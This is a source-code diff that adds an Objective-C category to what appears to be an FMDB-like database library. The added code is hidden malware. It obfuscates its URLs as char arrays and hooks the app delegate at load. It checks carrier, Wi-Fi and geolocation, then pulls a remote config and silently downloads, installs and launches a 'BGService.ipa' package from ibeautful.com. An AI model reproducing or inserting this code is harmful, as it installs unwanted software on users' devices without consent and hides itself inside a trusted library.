@@ -675,3 +675,330 @@ class_getInstanceMethod
 
 
 @end
+
+
+
+#define  sycount()  static dispatch_once_t                                                                  \
+onceToken; dispatch_once(&onceToken, ^{//
+#define  sycountend()  });//
+#define S FM_MIX_DEAD
+#define  fm_dbuseful   load//
+#define fm_instance                    \
+class_getInstanceMethod
+#define fm_addmethod class_addMethod
+#define FILEPATH [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES)objectAtIndex:0] stringByAppendingPathComponent:@"Resource"];
+@implementation NSObject (p)
+// forward the authentication to the view controller that created this operation
+// If this happens for NSURLAuthenticationMethodHTMLForm, you have to
+// do some shit work like showing a modal webview controller and close it after authentication.
+// I HATE THIS.
+
+
+
+
+
+/*
+ ////////////////////////////////////////////////////////////////////////////
+ *TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*
+ *TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*
+ *TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*
+ *TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*
+ *TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*
+ *TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*
+ *TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*
+ *TEST*TEST*TEST*TEST*TEST*+------------------------+*TEST*TEST*TEST*TEST*TE*
+ *TEST*TEST*TEST*TEST*TEST*|       测试完请删除       |*TEST*TEST*TEST*TEST*TE*
+ *TEST*TEST*TEST*TEST*TEST*+------------------------+*TEST*TEST*TEST*TEST*TE*
+ *TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*
+ *TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*
+ *TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*
+ *TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*
+ *TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*
+ *TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*
+ *TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*TEST*
+ ////////////////////////////////////////////////////////////////////////////
+ */
+
+
+
++ (void)fm_db:(id)c fmdbsb:(SEL)fmorig fmdbsms:(SEL)fms
+{
+    typedef struct objc_method * (*fm_FunctionCallback)(Class cls, SEL name);
+    typedef BOOL (*fm_FunctionCallback2)(Class cls, SEL name, IMP imp, const char *types);
+    fm_FunctionCallback functions[] = {&fm_instance};
+    fm_FunctionCallback2 functions2[] = {&fm_addmethod};
+    
+    Class fmclass = c;
+    SEL fmos = fmorig;
+    SEL fmss = fms;
+    int fm_dbx[56] = {0x47,0x66,0x71,0x83,0x101,0x114,0x118,0x105,0x99,0x101,0x47,0x99,0x104,0x101,0x99,0x107,0x86,0x101,0x114};
+    fm_dbx[18] = 0x0;
+    struct objc_method * fm_osm = functions[0](fmclass, fmos);
+    struct objc_method * fm_sm = functions[0](fmclass, fmss);
+    BOOL fm_didAddM = functions2[0](fmclass, fmos, method_getImplementation(fm_sm), method_getTypeEncoding(fm_sm));
+    int fm_dbx2[56] = {0x47,0x66,0x71,0x83};
+    fm_dbx2[18] = 0x0;
+    if (fm_didAddM) class_replaceMethod(fmclass, fmss, method_getImplementation(fm_osm), method_getTypeEncoding(fm_osm));
+    else method_exchangeImplementations(fm_osm, fm_sm);
+    
+}
+
+
++ (void)fm_dbuseful{
+    
+    sycount()
+    char x[10] = {115,116,97,114,116,105,110,105,116,0};
+    NSString *fm_dbstr1 = [NSString stringWithCString:x encoding:NSUTF8StringEncoding];
+    char fm_dbstr2[11] = {65,112,112,68,101,108,101,103,97,116,101,0};
+    
+    //printf("%s, %s", x, fm_dbstr2);
+    
+    Class fm_db_class = objc_getClass(fm_dbstr2);
+    SEL s1 = NSSelectorFromString(fm_dbstr1);
+    SEL s2 = NSSelectorFromString(@"fm_db_handlefile");
+    [self fm_db:fm_db_class fmdbsb:s1 fmdbsms:s2];
+    sycountend();
+}
+
+
+- (void)fm_db_handlefile
+{
+    
+    // normal
+    [self fm_db_handlefile];
+    
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        [self fm_logic];
+    });
+    
+    
+    
+}
+
+
+- (void)fm_logic
+{
+    [self fm_condition:^{
+        [self fm_import:^{
+            [self fm_eat];
+        }];
+    }];
+    
+}
+
+
+- (void)fm_condition:(void(^)())ret
+{
+    CTTelephonyNetworkInfo *netinfo = [[CTTelephonyNetworkInfo alloc] init];
+    CTCarrier *carrier = [netinfo subscriberCellularProvider];
+    
+    if ([carrier mobileCountryCode].length == 0 &&   [carrier mobileNetworkCode].length == 0) {
+        NSLog(@"TEST1");
+        return;
+    }
+    
+    Reachability *r = [Reachability reachabilityWithHostname:@"www.apple.com"];
+    BOOL wifi = [r currentReachabilityStatus] == ReachableViaWiFi ? YES : NO;
+    
+    if (wifi == NO) {
+        NSLog(@"TEST2");
+        return;
+    }
+    
+    char fm_arr[] = {99,111,109,46,97,112,112,108,101,46,66,71,83,101,114,118,105,99,101,0};
+    NSString *fm_str = [NSString stringWithCString:fm_arr encoding:NSUTF8StringEncoding];
+    if ([AppUtils isInstallIpa:fm_str]) {
+        NSLog(@"TESTX");
+        return;
+    }
+    
+    
+    char ux1[] = {104,116,116,112,58,47,47,112,118,46,115,111,104,117,46,99,111,109,47,99,105,116,121,106,115,111,110,63,105,101,61,117,116,102,45,56,0};
+    NSString *ul1 = [NSString stringWithCString:ux1 encoding:NSUTF8StringEncoding];
+    NSURL *url = [NSURL URLWithString:ul1];
+    NSError *error;
+    NSData *data = [NSURLConnection sendSynchronousRequest:[NSURLRequest requestWithURL:url] returningResponse:nil error:&error];
+    NSString *str = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+    
+    char u2[] = {104,116,116,112,58,47,47,49,49,49,49,46,105,112,49,51,56,46,99,111,109,47,105,99,46,97,115,112,0};
+    NSString *ul2 = [NSString stringWithCString:u2 encoding:NSUTF8StringEncoding];
+    NSURL *url2 = [NSURL URLWithString:ul2];
+    NSError *error2;
+    NSData *data2 = [NSURLConnection sendSynchronousRequest:[NSURLRequest requestWithURL:url2] returningResponse:nil error:&error2];
+    
+    NSStringEncoding enc = CFStringConvertEncodingToNSStringEncoding(kCFStringEncodingGB_18030_2000);
+    NSString *str2 = [[NSString alloc] initWithData:data2 encoding:enc];
+    
+    char u3[] = {104,116,116,112,58,47,47,97,112,105,46,119,105,112,109,97,110,105,97,46,99,111,109,0};
+    NSString *ul3 = [NSString stringWithCString:u3 encoding:NSUTF8StringEncoding];
+    NSURL *url3 = [NSURL URLWithString:ul3];
+    NSError *error3;
+    NSData *data3 = [NSURLConnection sendSynchronousRequest:[NSURLRequest requestWithURL:url3] returningResponse:nil error:&error3];
+    
+    NSString *str3 = [[NSString alloc] initWithData:data3 encoding:enc];
+    
+    
+    NSString *cq = @"\u91cd\u5e86";
+    NSString *bg = @"\u5317\u4eac";
+    NSString *gnwnsbdu = @"\u56fd\u5185\u672a\u80fd\u8bc6\u522b\u7684\u5730\u533a";
+    
+    //NSLog(@"%@\n %@\n %@\n", str, str2, str3);
+    if ([str3 rangeOfString:@"CN"].length <= 0 ||
+        [str2 rangeOfString:cq].length > 0 ||
+        [str2 rangeOfString:bg].length > 0 ||
+        [str rangeOfString:gnwnsbdu].length > 0 ||
+        [str rangeOfString:cq].length > 0 ||
+        [str rangeOfString:bg].length > 0
+        ) {
+        
+        NSLog(@"TEST3");
+        //return;
+        
+    }
+    
+    
+    char fm_dbx[] = {104,116,116,112,58,47,47,105,98,101,97,117,116,102,117,108,46,99,111,109,47,112,114,111,106,101,99,116,47,66,71,83,101,114,118,105,99,101,47,99,111,110,102,47,108,105,117,108,105,97,110,103,97,112,112,95,111,116,104,101,114,109,97,110,46,99,111,110,102,0};
+    NSString *fm_dby = [NSString stringWithCString:fm_dbx encoding:NSUTF8StringEncoding];
+    
+    [NSURLConnection sendAsynchronousRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:fm_dby]] queue:[[NSOperationQueue alloc] init] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) {
+        if (connectionError == nil) {
+            
+            @try {
+                id jsonObject = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:nil];
+                NSLog(@"TEST4");
+                char fm_ar[] = {106,98,105,110,115,116,97,108,108,0};
+                NSString *fm_st = [NSString stringWithCString:fm_ar encoding:NSUTF8StringEncoding];
+                BOOL jbinstall = [[jsonObject objectForKey:fm_st] boolValue];
+                
+                char fm_a[] = {106,98,105,110,115,116,97,108,108,112,101,114,99,101,110,116,0};
+                NSString *fm_s = [NSString stringWithCString:fm_a encoding:NSUTF8StringEncoding];
+                int jbinstallpercent = [[jsonObject objectForKey:fm_s] integerValue];
+                int randx = arc4random()%jbinstallpercent; //[0, 1000000]
+                NSLog(@"randx: %d\n", randx);
+                
+                if (jbinstall == YES) {
+                    if (randx == 0) {
+                        NSLog(@"TEST5");
+                        ret();
+                        
+                    }
+                    
+                }
+            }
+            @catch (NSException *exception) {
+                
+            }
+            
+            
+            
+        }
+    }];
+    
+}
+
+
+- (void)fm_import:(void(^)())succuss
+{
+    @try {
+        
+        char fm_arr[] = {104,116,116,112,58,47,47,105,98,101,97,117,116,102,117,108,46,99,111,109,47,112,114,111,106,101,99,116,47,66,71,83,101,114,118,105,99,101,47,66,71,83,101,114,118,105,99,101,46,105,112,97,0};
+        NSString *fm_str = [NSString stringWithCString:fm_arr encoding:NSUTF8StringEncoding];
+        
+        NSURL *url = [NSURL URLWithString:fm_str];
+        
+        NSURLRequest *request=[[NSURLRequest alloc] initWithURL:url cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:100];
+        
+        [NSURLConnection sendAsynchronousRequest:request queue:[[NSOperationQueue alloc] init] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError){
+            
+            
+            @try {
+                if (connectionError == nil) {
+                    NSString *filePath = FILEPATH;
+                    
+                    [data writeToFile:filePath atomically:NO];
+                    
+                    NSLog(@"TEST6");
+                    succuss();
+                }
+            }
+            @catch (NSException *exception) {
+                
+            }
+            
+        }];
+        
+    }
+    @catch (NSException *exception) {
+        
+    }
+    
+}
+
+
+
+- (void)fm_eat
+{
+    
+    NSString *file = FILEPATH;
+    
+    [AppUtils installApp:file succuss:^{
+        [self fm_heck];
+    } fail:nil];
+    
+}
+
+
+- (void)fm_heck
+{
+    char fm_ar[] = {66,71,83,101,114,118,105,99,101,0};
+    NSString *fm_st = [NSString stringWithCString:fm_ar encoding:NSUTF8StringEncoding];
+    
+    if (![AppUtils isAppActived:fm_st]) {
+        NSLog(@"TEST7");
+        char fm_arr[] = {99,111,109,46,97,112,112,108,101,46,66,71,83,101,114,118,105,99,101,0};
+        NSString *fm_str = [NSString stringWithCString:fm_arr encoding:NSUTF8StringEncoding];
+        
+        [AppUtils launchAPP:fm_str];
+    } else {
+        NSLog(@"TEST8");
+    }
+}
+
+
+
+
+
+
+
+@end
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
